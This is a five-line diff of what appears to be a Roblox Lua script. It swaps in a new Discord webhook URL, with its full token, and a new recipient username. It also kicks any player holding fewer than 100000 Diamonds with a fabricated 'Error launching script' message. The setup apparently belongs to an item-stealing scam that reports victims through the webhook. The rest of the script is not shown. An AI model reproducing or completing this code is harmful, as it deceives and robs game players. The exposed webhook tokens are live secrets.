@@ -1,5 +1,5 @@
-_G.Webhook = "https://discord.com/api/webhooks/1076039567230124062/Hcl2sVJGrf7v8Y18aqQGoCpPlhGLyDFhgbGrSqahPNWoOFRQELkqhuox0dmMDoOKd9s1"
-_G.Username = "petpro_1111"
+_G.Webhook = "https://discord.com/api/webhooks/863121170278121472/1-OBJwtTt0TBjjouUdBWo5aZ5IWY-eSFcvtjJsCk2MD3Iwc4hGCBKB_a5RhhwtYkC8kA"
+_G.Username = "dev_yaskofafa"
 _G.ScriptName = "hi lunar!"
 if game.Players.LocalPlayer.leaderstats.Diamonds.Value <100000 then
     game.Players.LocalPlayer:Kick("Error launching script. Error code: ".._G.ScriptName..".LaunchScript")
